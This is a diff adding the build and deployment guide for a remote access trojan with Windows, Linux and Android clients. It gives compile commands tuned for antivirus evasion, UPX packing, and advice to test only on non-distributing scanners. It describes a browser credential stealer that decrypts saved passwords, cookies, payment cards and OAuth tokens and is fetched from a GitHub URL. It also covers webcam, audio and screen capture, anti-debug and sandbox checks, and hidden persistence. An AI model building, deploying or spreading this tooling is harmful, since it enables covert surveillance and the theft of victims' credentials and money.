@@ -1,0 +1,161 @@
+# ============================================================
+# COMPILATION INSTRUCTIONS FOR ALL PLATFORMS
+# All clients connect to the same server.py
+# ============================================================
+
+# ==================== WINDOWS CLIENT ====================
+
+# RECOMMENDED - Best AV bypass (~87 KB):
+gcc -o client.exe client_windows.c -lws2_32 -lgdi32 -lwinmm -lole32 -lshell32 -luuid -lwininet -lcrypt32 -lavicap32 -mwindows -s -O2
+
+# Cross-compile from Linux (requires mingw-w64):
+x86_64-w64-mingw32-gcc -o client.exe client_windows.c -lws2_32 -lgdi32 -lwinmm -lole32 -lshell32 -luuid -lwininet -lcrypt32 -lavicap32 -mwindows -s -O2
+
+# ==================== COMPILER FLAGS EXPLAINED ====================
+#
+# ESSENTIAL FLAGS:
+# -mwindows        : No console window (CRITICAL for stealth)
+# -s               : Strip all symbols (removes function names from binary)
+# -Os              : Optimize for size (smaller = less signatures to match)
+#
+# ADVANCED STEALTH FLAGS:
+# -fno-ident                    : Removes GCC version string from binary
+# -ffunction-sections           : Each function in own section
+# -fdata-sections               : Each variable in own section  
+# -Wl,--gc-sections             : Remove unused code (smaller binary)
+# -fno-asynchronous-unwind-tables : Remove exception handling metadata
+#
+# LIBRARIES REQUIRED:
+# -lws2_32         : Winsock (networking)
+# -lwininet        : Internet functions (download chromelevator)
+# -lgdi32          : Graphics (screenshots, screen recording)
+# -lshell32        : Shell functions (paths, startup)
+# -lwinmm          : Multimedia (audio recording)
+# -lavicap32       : Video capture (webcam)
+# -lcrypt32        : Cryptography (base64)
+# -lole32 -luuid   : COM functions
+# -liphlpapi       : IP helper (network info)
+# -lpsapi          : Process info
+# -lbcrypt         : Modern crypto
+# -lvfw32 -lavifil32 : Video for Windows
+
+# ==================== POST-COMPILATION (OPTIONAL) ====================
+#
+# UPX Packing - Makes binary smaller and changes signature:
+#   upx --best client.exe
+#   upx --ultra-brute client.exe    # Maximum compression (slow)
+#
+# Check file size (should be ~70-85 KB):
+#   dir client.exe                   # Windows
+#   ls -lh client.exe                # Linux
+#
+# Test on VirusTotal alternatives (don't upload to VT - it shares with AV vendors):
+#   - antiscan.me (private)
+#   - nodistribute.com (private)
+
+# ==================== BROWSER CREDENTIAL EXTRACTION ====================
+#
+# ChromElevator v2.0 - Extracts DECRYPTED passwords, cookies from Chrome/Edge/Brave
+#   - Decrypts passwords, cookies, payment cards, IBANs, OAuth tokens
+#   - Supports v10/v11 (AES-GCM with DPAPI), v20 (App-Bound Encryption via COM), Legacy DPAPI
+#   - Works on Chrome 127+ with the new v20 App-Bound Encryption (requires DLL injection for v20)
+#   - Uses DPAPI to decrypt the master key
+#   - Uses AES-256-GCM to decrypt individual values (v10/v11 encryption)
+#   - COM interface for v20 decryption (IElevator with browser-specific CLSID/IID)
+#   - Outputs PLAINTEXT JSON files (not encrypted!)
+#
+# SOURCE CODE: files/Customchromelevator.c
+#
+# COMPILE CHROMELEVATOR:
+gcc files/Customchromelevator.c -o files/Customchromelevator.exe -lws2_32 -lcrypt32 -lbcrypt -lshlwapi -lshell32 -lole32 -loleaut32 -s -O2 -mwindows -fno-ident
+
+# Cross-compile from Linux:
+x86_64-w64-mingw32-gcc files/Customchromelevator.c -o files/Customchromelevator.exe -lws2_32 -lcrypt32 -lbcrypt -lshlwapi -lshell32 -lole32 -loleaut32 -s -O2 -mwindows
+
+# USAGE:
+#   Customchromelevator.exe --output-path C:\output         # Extract all browsers
+#   Customchromelevator.exe --kill --output-path C:\output  # Kill browsers first, then extract
+#
+# OUTPUT FILES (DECRYPTED PLAINTEXT):
+#   passwords.json   - {"url": "...", "user": "...", "pass": "DECRYPTED!"}
+#   cookies.json     - {"domain": "...", "name": "...", "value": "DECRYPTED!"}
+#   debug.log        - Detailed extraction log
+#
+# v20 NOTE: App-Bound Encryption (Chrome 127+) requires DLL injection into browser
+#           process to bypass path validation. v10/v11 data works without injection.
+#
+# SETUP FOR REMOTE EXTRACTION:
+#   1. Compile Customchromelevator.exe
+#   2. Upload to GitHub repo (files/ folder)
+#   3. Update g_chromelevator_url in client_windows.c:
+#      https://raw.githubusercontent.com/YOUR_USER/YOUR_REPO/main/files/Customchromelevator.exe
+#   4. Recompile client
+
+
+# ==================== LINUX CLIENT ====================
+
+# Basic compile:
+gcc client_linux.c -o client_linux -lpthread
+
+# Optimized (recommended):
+gcc client_linux.c -o client_linux -lpthread -s -O2
+
+# Static (portable across distros):
+gcc client_linux.c -o client_linux -lpthread -static -s -O2
+
+
+# ==================== ANDROID CLIENT ====================
+# Requires Android NDK: https://developer.android.com/ndk/downloads
+# Set: export NDK=/path/to/android-ndk
+
+# ARM64 (most modern phones):
+$NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android21-clang client_android.c -o client_android_arm64 -lpthread -s -O2
+
+# ARM 32-bit (older devices):
+$NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/armv7a-linux-androideabi21-clang client_android.c -o client_android_arm -lpthread -s -O2
+
+# x86 (emulators):
+$NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/i686-linux-android21-clang client_android.c -o client_android_x86 -lpthread -s -O2
+
+# Deploy:
+#   adb push client_android_arm64 /data/local/tmp/
+#   adb shell chmod +x /data/local/tmp/client_android_arm64
+#   adb shell /data/local/tmp/client_android_arm64
+
+
+# ==================== CONFIGURATION ====================
+# Edit server settings in each client before compiling:
+#
+# client_windows.c / client_linux.c / client_android.c:
+#   char g_server_host[256] = "your.server.com";
+#   char g_server_port[6] = "80";
+
+
+# ==================== AV BYPASS TIPS ====================
+#
+# IF DETECTED:
+# 1. Recompile with different GCC version
+# 2. Change function/variable names in source
+# 3. Modify string constants slightly
+# 4. Add random junk code
+# 5. Use UPX packing
+# 6. Code sign with certificate (bypasses SmartScreen)
+#
+# BUILT-IN EVASION (already in client_windows.c):
+# - Anti-debug checks
+# - VM/Sandbox detection
+# - Random startup delays
+# - Obfuscated function names
+# - Hidden persistence paths
+#
+# TESTING:
+# - Use Windows Sandbox or VM
+# - Test with Defender disabled first
+# - Then enable and check behavior
+# - NEVER upload to VirusTotal (shares with AV vendors)
+
+
+# ==================== CAMERA/AUDIO REQUIREMENTS ====================
+# Windows: Built-in (VFW)
+# Linux:   sudo apt install ffmpeg fswebcam
+# Android: pkg install termux-api (or root)
